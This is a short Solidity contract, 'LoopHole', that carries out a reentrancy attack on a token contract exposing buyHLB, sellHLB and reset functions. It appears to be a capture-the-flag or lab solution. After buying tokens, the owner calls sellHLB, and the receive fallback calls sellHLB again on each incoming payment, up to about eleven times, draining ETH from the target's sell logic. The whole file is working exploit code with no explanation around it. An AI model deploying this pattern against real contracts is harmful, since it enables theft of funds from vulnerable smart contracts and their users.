pragma solidity 0.8.14;

interface IToken {
    function sellHLB(uint256 numTokens) external;
    function reset() external returns (string memory);
    function buyHLB() external payable;
}

contract LoopHole {
    address private _owner;
    IToken _contract;
    uint count = 0;

    constructor(address c) payable{
        _contract = IToken(c);
        _owner = msg.sender;
        _contract.reset();
        _contract.buyHLB{value: 150}();
    }

    modifier onlyOwner() {
        require(msg.sender == _owner);
        _;
    }

    function set_count(uint c) public onlyOwner {
        count = c;
    }

    function trigger() onlyOwner public {
        _contract.sellHLB(1);
    }

    receive() external payable {
        if(count <= 10){
            count += 1;
            _contract.sellHLB(1);
        }
    }
}